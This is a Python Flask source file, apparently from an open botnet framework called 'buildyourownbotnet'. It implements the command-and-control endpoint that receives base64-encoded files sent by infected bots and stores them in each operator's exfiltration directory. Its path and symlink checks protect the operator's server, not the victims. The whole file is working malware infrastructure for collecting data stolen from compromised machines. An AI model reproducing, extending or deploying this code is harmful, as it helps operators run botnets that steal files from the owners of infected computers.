import os
import base64
import string
import random
from flask import Blueprint, request
from buildyourownbotnet.core import generators
from buildyourownbotnet.core.dao import file_dao, user_dao
from buildyourownbotnet.core.path_safety import contained_user_dir, safe_filename

OUTPUT_ROOT = os.path.abspath('buildyourownbotnet/output')
MAX_UPLOAD_BYTES = 10 * 1024 * 1024


# Blueprint
files = Blueprint('files', __name__)


@files.route("/api/file/add", methods=["POST"])
def file_add():
	"""Upload new exfilrated file."""
	b64_data = request.form.get('data')
	filetype = request.form.get('type')
	owner = request.form.get('owner')
	module = request.form.get('module')
	session = request.form.get('session')
	filename = request.form.get('filename')

	# decode any base64 values
	try:
		data = base64.b64decode(b64_data)
	except:
		if b64_data.startswith('_b64'):
			data = base64.b64decode(b64_data[6:]).decode('ascii')
		else:
			print('/api/file/add error: invalid data ' + str(b64_data))
			return
	try:
		session = base64.b64decode(session)
	except:
		try:
			if session.startswith('_b64'):
				session = base64.b64decode(session[6:]).decode('ascii')
		except:
			pass

	# add . to file extension if necessary
	if not filetype:
		filetype = '.dat'
	elif not filetype.startswith('.'):
		filetype = '.' + filetype

	# Uploads arrive from bots without an operator session, so never trust
	# owner/filename as path components. Bots can only write one file inside
	# their own owner's exfiltration directory.
	user = user_dao.get_user(username=owner)
	if user is None:
		return ('unknown owner', 400)

	if not filename:
		filename = generators.variable(length=3) + filetype
	filename = safe_filename(filename)
	if filename is None or len(data) > MAX_UPLOAD_BYTES:
		return ('invalid upload', 400)

	try:
		files_dir = contained_user_dir(OUTPUT_ROOT, user.username) / 'files'
	except ValueError:
		return ('invalid owner', 400)
	files_dir.mkdir(parents=True, exist_ok=True, mode=0o700)
	output_path = files_dir / filename

	# Refuse to overwrite or follow a planted symlink.
	flags = os.O_WRONLY | os.O_CREAT | os.O_EXCL | getattr(os, 'O_NOFOLLOW', 0)
	try:
		fd = os.open(output_path, flags, 0o600)
	except FileExistsError:
		return ('file already exists', 409)
	with os.fdopen(fd, 'wb') as fp:
		fp.write(data)

	file_dao.add_user_file(user.username, filename, session, module)
	return filename
